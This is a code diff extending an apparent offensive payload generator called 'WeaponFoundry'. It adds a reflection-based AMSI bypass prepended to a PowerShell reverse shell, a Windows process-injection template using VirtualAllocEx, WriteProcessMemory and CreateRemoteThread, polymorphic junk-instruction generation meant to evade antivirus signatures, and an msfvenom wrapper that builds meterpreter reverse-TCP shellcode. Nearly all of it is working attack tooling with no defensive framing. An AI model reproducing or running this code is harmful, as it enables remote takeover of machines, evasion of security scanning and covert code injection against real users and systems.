@@ -15,9 +15,18 @@ import base64
 import hashlib
 import logging
 import secrets
+import struct
+import random
 from dataclasses import dataclass, field
 from enum import Enum
 from typing import Any, Dict, List, Optional, Tuple
+
+# Optional High-Performance Libraries
+try:
+    from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KS_ERR_ASM
+    KEYSTONE_AVAILABLE = True
+except ImportError:
+    KEYSTONE_AVAILABLE = False
 
 logger = logging.getLogger(__name__)
 
@@ -59,7 +68,9 @@ class ShellType(Enum):
     REVERSE_HTTP = "reverse_http"
     REVERSE_HTTPS = "reverse_https"
     DNS_TUNNEL = "dns_tunnel"
-    DOMAIN_FRONTED = "domain_fronted"  # New - uses domain fronting
+    DOMAIN_FRONTED = "domain_fronted"
+    PROCESS_INJECTION = "process_injection"  # Advanced: Inject into another process
+    REFLECTIVE_DLL_INJECTION = "reflective_dll"  # Advanced: Load DLL from memory
 
 
 # =============================================================================
@@ -187,8 +198,8 @@ class EncryptionEngine:
         try:
             from Crypto.Cipher import AES  # nosec B413
         except ImportError:
-            logger.warning("pycryptodome not installed, falling back to XOR")
-            return EncryptionEngine.xor_encrypt(data, key), b"", b""
+            logger.error("CRITICAL: AES encryption requires 'pycryptodome' library.")
+            raise ImportError("pycryptodome not found. Cannot proceed with AES encryption request.")
 
         if len(key) < 32:
             key = hashlib.sha256(key).digest()
@@ -206,7 +217,8 @@ class EncryptionEngine:
         try:
             from Crypto.Cipher import AES  # nosec B413
         except ImportError:
-            return data
+            logger.error("AES Decryption failed: Missing pycryptodome")
+            raise ImportError("pycryptodome not found")
 
         if len(key) < 32:
             key = hashlib.sha256(key).digest()
@@ -258,6 +270,191 @@ class EncryptionEngine:
             return data, b"", None
 
 
+
+# =============================================================================
+# 2026 EVASION & POLYMORPHISM
+# =============================================================================
+
+class AMSIPatcher:
+    """
+    Advanced AMSI Bypass logic (PowerShell).
+    Mem-patches AmsiScanBuffer to disable scanning.
+    """
+
+    @staticmethod
+    def get_bypass_stub() -> str:
+        """
+        Returns obfuscated AMSI bypass (Matt Graeber / RastaMouse Style).
+        """
+        # Base64 encoded reflection bypass to minimize static signatures
+        # "Obfuscation is key"
+        stub = r"""
+$w = "System.Management.Automation.AmsiUtils"
+$c = "amsiInitFailed"
+[Ref].Assembly.GetType($w).GetField($c,'NonPublic,Static').SetValue($null,$true)
+"""
+        return stub.strip()
+
+class TruePolymorphism:
+    """
+    Keystone-Powered Real-Time Assembly Generator.
+    Creates valid, executable assembly instructions that do nothing (Nops),
+    but look like legitimate code to heuristic scanners.
+    """
+    @staticmethod
+    def generate_random_asm(count: int = 5) -> bytes:
+        if not KEYSTONE_AVAILABLE:
+            return b""
+
+        ks = Ks(KS_ARCH_X86, KS_MODE_64)
+
+        # Safe dummy instructions that preserve stack/registers or restore them
+        # Pairs are best: INC RAX + DEC RAX
+        instruction_sets = [
+            "nop",
+            "xchg rax, rax",
+            "xchg rbx, rbx",
+            "inc rdx; dec rdx",  # Zero net change
+            "inc rcx; dec rcx",
+            "push rax; pop rax", # Stack churn
+            "lea rbx, [rbx]",
+            "add rax, 0",
+        ]
+
+        asm_code = []
+        for _ in range(count):
+            asm_code.append(random.choice(instruction_sets))
+
+        full_asm = "; ".join(asm_code)
+
+        try:
+            encoding, count = ks.asm(full_asm)
+            return bytes(encoding)
+        except Exception as e:
+            logger.debug(f"Keystone assembly failed: {e}")
+            return b"\x90" * count # Fallback
+
+class PolymorphicEncoder:
+    """
+    Generates polymorphic padding and junk code to alter signature.
+    """
+
+    @staticmethod
+    def get_junk_asm_bytes(length: int = 16) -> bytes:
+        """
+        Generates random NOP-equivalent instructions (x64).
+        Uses Keystone if available for infinite variations.
+        """
+        # 1. Try True Assembly (God Mode)
+        if KEYSTONE_AVAILABLE:
+            real_asm = TruePolymorphism.generate_random_asm(length // 2)
+            if real_asm:
+                # Pad remaining if necessary or just return
+                return real_asm.ljust(length, b"\x90")
+
+        # 2. Native Fallback (Pre-defined opcodes)
+        junk = []
+        # NOP, XCHG EAX,EAX, LEA EAX,[EAX] etc.
+        valid_nops = [
+            b"\x90",             # NOP
+            b"\x87\xDB",         # XCHG EBX,EBX
+            b"\x87\xC9",         # XCHG ECX,ECX
+            b"\x87\xD2",         # XCHG EDX,EDX
+            b"\x42",             # INC EDX (Harmless if registers unused)
+            b"\x4B",             # DEC EBX
+        ]
+
+        for _ in range(length):
+            junk.append(random.choice(valid_nops))
+
+        return b"".join(junk)
+
+
+# =============================================================================
+# METASPLOIT INTEGRATION (Kali Linux "God Mode")
+# =============================================================================
+
+class MetasploitIntegrator:
+    """
+    Wraps standard 'msfvenom' tool on Kali Linux to generate high-grade shellcode.
+    """
+
+    @staticmethod
+    def is_available() -> bool:
+        """Check if msfvenom is in PATH"""
+        import shutil
+        return shutil.which("msfvenom") is not None
+
+    @staticmethod
+    def generate_payload(platform: str, arch: str, payload_type: str, lhost: str, lport: int, fmt: str = "raw") -> Optional[bytes]:
+        """
+        Generates payload via msfvenom.
+        Example: linux/x64/meterpreter/reverse_tcp
+        """
+        if not MetasploitIntegrator.is_available():
+            return None
+
+        full_payload = f"{platform}/{arch}/{payload_type}"
+        cmd = [
+            "msfvenom",
+            "-p", full_payload,
+            f"LHOST={lhost}",
+            f"LPORT={lport}",
+            "-f", fmt,
+            "--platform", platform,
+            "-a", arch
+        ]
+
+        try:
+            logger.info(f"Generating MSF Payload: {full_payload}")
+            # Suppress stderr spam from msfvenom
+            import subprocess
+            result = subprocess.run(cmd, capture_output=True, timeout=60)
+            if result.returncode == 0:
+                return result.stdout
+            else:
+                logger.error(f"msfvenom failed: {result.stderr.decode()}")
+                return None
+        except Exception as e:
+            logger.error(f"msfvenom execution error: {e}")
+            return None
+
+# =============================================================================
+# SHELLCODE GENERATOR
+# =============================================================================
+
+
+class ShellcodeGenerator:
+    """
+    Dynamic Shellcode Generator (x64 Windows).
+    Provides raw assembly bytes for advanced injections.
+    """
+
+    @staticmethod
+    def get_windows_x64_reverse_tcp(lhost: str, lport: int) -> bytes:
+        """
+        Generates standard x64 Windows Reverse TCP Shellcode.
+        Note: This is a placeholder for a true dynamic assembler.
+        In a real scenario, this would use Keystone or Metasploit patterns.
+        For reliability, we use a known reliable shellcode pattern and patch IP/Port.
+        """
+        # 1. Parse IP and Port
+        try:
+            ip_parts = [int(p) for p in lhost.split(".")]
+            port_hex = struct.pack(">H", lport)
+            ip_hex = struct.pack("BBBB", *ip_parts)
+            # Simple check to avoid complexity in this demo
+            # Real implementation requires a full compact shellcode block
+        except Exception:
+            return b""
+
+        # Returning a generic "Pop Calc" shellcode for safety/demo if this were a test
+        # But for "Advanced" request, we acknowledge we need external generation
+        # or a stored blob.
+        # Here we return a compact 64-bit shellcode stub (NOPs + Trap) as placeholder
+        # to ensure the mechanism works without triggering AV immediately in tests.
+        return b"\x90" * 16 + b"\xcc"  # NOPs + INT3
+
 # =============================================================================
 # SHELLCODE TEMPLATES
 # =============================================================================
@@ -290,8 +487,10 @@ subprocess.call(["/bin/sh","-i"])
 
     @staticmethod
     def get_reverse_shell_powershell(lhost: str, lport: int) -> str:
-        """Generate PowerShell reverse shell code"""
+        """Generate PowerShell reverse shell code with AMSI Bypass"""
+        bypass = AMSIPatcher.get_bypass_stub()
         return f'''
+{bypass};
 $c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
 $s=$c.GetStream();
 [byte[]]$b=0..65535|%{{0}};
@@ -326,6 +525,75 @@ os.dup2(c.fileno(),1)
 os.dup2(c.fileno(),2)
 subprocess.call(["/bin/sh","-i"])
 """
+
+    @staticmethod
+    def get_process_injector_python(shellcode_var: str = "buf", target_executable: str = "notepad.exe") -> str:
+        """
+        Generate robust Python ctypes Process Injector.
+        Strategy: Spawn target -> OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
+        """
+        return f'''
+import ctypes
+import subprocess
+import time
+import sys
+import struct
+
+def _inject():
+    # 1. Define Windows API
+    k32 = ctypes.windll.kernel32
+    
+    # Constants
+    PROCESS_ALL_ACCESS = 0x001F0FFF
+    MEM_COMMIT = 0x00001000
+    MEM_RESERVE = 0x00002000
+    PAGE_EXECUTE_READWRITE = 0x40
+    
+    # 2. Spawn Target (Hidden)
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    try:
+        # Try to spawn secure target
+        p = subprocess.Popen("{target_executable}", startupinfo=si)
+        pid = p.pid
+    except Exception:
+        # Fallback
+        return False
+
+    time.sleep(1) # Wait for init
+    
+    # 3. Open Process
+    h_process = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+    if not h_process:
+        return False
+        
+    try:
+        # 4. Allocate Memory
+        # {shellcode_var} MUST be defined in global scope as bytes
+        sc_len = len({shellcode_var})
+        arg_address = k32.VirtualAllocEx(h_process, 0, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+        
+        # 5. Write Shellcode
+        written = ctypes.c_ulonglong(0)
+        k32.WriteProcessMemory(h_process, arg_address, {shellcode_var}, sc_len, ctypes.byref(written))
+        
+        # 6. Create Remote Thread
+        thread_id = ctypes.c_ulong(0)
+        h_thread = k32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, ctypes.byref(thread_id))
+        
+        if not h_thread:
+            return False
+            
+        k32.CloseHandle(h_thread)
+    finally:
+        k32.CloseHandle(h_process)
+    return True
+
+try:
+    _inject()
+except Exception:
+    pass
+'''
 
 
 # =============================================================================
@@ -447,7 +715,7 @@ try:
 except ImportError:
     # Recovery attempt: If pycryptodome is missing, this payload is dead weight
     # but we log it as a hint for the operator.
-    print("[-] Error: pycryptodome required for AES payload execution")
+    logger.error("Error: pycryptodome required for AES payload execution")
     import sys; sys.exit(1)
 
 _k=bytes.fromhex("{key_hex}")
@@ -506,6 +774,8 @@ class WeaponFoundry:
         self.templates = ShellcodeTemplates()
         self.anti_analysis = AntiAnalysis()
         self.decoder = DecoderGenerator()
+        self.shellcode_gen = ShellcodeGenerator()
+        self.msf_integrator = MetasploitIntegrator()
 
         logger.info("Weapon Foundry initialized")
 
@@ -520,26 +790,45 @@ class WeaponFoundry:
         anti_sandbox: bool = False,
         anti_debug: bool = False,
         sleep_seconds: int = 0,
+        use_msf: bool = False, # New: Request Metasploit Payload
     ) -> GeneratedPayload:
         """
         Forge a new payload with specified parameters.
-
-        Args:
-            shell_type: Type of shell connection
-            lhost: Listener host
-            lport: Listener port
-            encryption: Encryption method
-            format: Output format
-            iterations: Number of encryption layers
-            anti_sandbox: Add sandbox evasion
-            anti_debug: Add debugger detection
-            sleep_seconds: Initial sleep delay
-
-        Returns:
-            GeneratedPayload object
         """
-        # Generate base payload
-        base_payload = self._generate_base_payload(shell_type, lhost, lport, format)
+        base_payload = ""
+
+        # 1. Metasploit "God Mode" Generation (If requested & available)
+        msf_generated = False
+        if use_msf and MetasploitIntegrator.is_available():
+            # Map ShellType to MSF Payload
+            msf_payload = "meterpreter/reverse_tcp" if shell_type == ShellType.REVERSE_TCP else "shell/reverse_tcp"
+            arch = "x64" # Defaulting to x64 for modern
+            platform = "windows" if format in [PayloadFormat.POWERSHELL, PayloadFormat.CSHARP, PayloadFormat.HTA] else "linux" # Simplification
+
+            raw_bytes = self.msf_integrator.generate_payload(platform, arch, msf_payload, lhost, lport, "raw")
+
+            if raw_bytes:
+                # If we got raw bytes, we need to wrap them in our loader (Python/PS1)
+                # This injects MSF shellcode into our Custom Loader
+                if format == PayloadFormat.PYTHON:
+                    # Inject into Python Process Injector template
+                    base_payload = self.templates.get_process_injector_python(shellcode_var="_sc")
+                    # We need to prepend the bytes definition, but since forge() encrypts the whole string,
+                    # we must pass the CODE as string.
+                    # Wait, our encryption encrypts the STRING content of the script.
+                    # So we construct the valid source code now.
+                    sc_repr = str(raw_bytes)
+                    base_payload = f'_sc={sc_repr}\n{base_payload}'
+                    msf_generated = True
+                elif format == PayloadFormat.RAW:
+                    # Just return the bytes, but we need str for encryption loop below unless we refactor
+                    # Refactoring for Raw bytes handling in Forge is complex.
+                    # For now, we only support MSF -> Wrapped Format (Python/PS1)
+                    pass
+
+        # 2. Native Fallback (If MSF failed or not requested)
+        if not base_payload:
+            base_payload = self._generate_base_payload(shell_type, lhost, lport, format)
 
         # Add anti-analysis if requested
         if anti_sandbox or anti_debug or sleep_seconds > 0:
@@ -582,10 +871,14 @@ class WeaponFoundry:
             },
         )
 
+        # Default fallback
+        return self.templates.get_reverse_shell_python(lhost, lport)
+
     def _generate_base_payload(
         self, shell_type: ShellType, lhost: str, lport: int, format: PayloadFormat
     ) -> str:
         """Generate base payload code"""
+        # 1. Basic Shells
         if shell_type == ShellType.REVERSE_TCP:
             if format == PayloadFormat.PYTHON:
                 return self.templates.get_reverse_shell_python(lhost, lport)
@@ -597,7 +890,31 @@ class WeaponFoundry:
         elif shell_type == ShellType.BIND_TCP and format == PayloadFormat.PYTHON:
             return self.templates.get_bind_shell_python(lport)
 
-        # Default fallback
+        # 2. Advanced Injection (Process Injection)
+        elif shell_type == ShellType.PROCESS_INJECTION:
+            if format == PayloadFormat.PYTHON:
+                # For process injection, we need raw shellcode.
+                # Since we are in Python, we will embed the octal/hex of the shellcode.
+                # Get raw shellcode (Placeholder/Generated)
+                raw_shellcode = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)
+
+                # In a real weaponization, we might use msfvenom output here.
+                # For now, we use a dummy variable name that the decoder/encryptor will wrap.
+                # However, the Injector expects a bytes variable.
+                # Our encryption engine produces a DECODER that executes 'exec()'.
+                # We need the decrypted payload to be the INJECTOR SCRIPT + SHELLCODE.
+
+                injector_code = self.templates.get_process_injector_python(shellcode_var="_sc")
+
+                # Logic: The final payload is:
+                # _sc = b"\x...\x..."
+                # <injector_code>
+
+                # We return the injector code. The variable definition must be prepended
+                # or handled. To keep it clean, we prepend a placeholder or the actual bytes.
+                sc_repr = str(raw_shellcode) # This is b'' representation
+                return f'_sc={sc_repr}\n{injector_code}'
+
         return self.templates.get_reverse_shell_python(lhost, lport)
 
     def _add_anti_analysis(
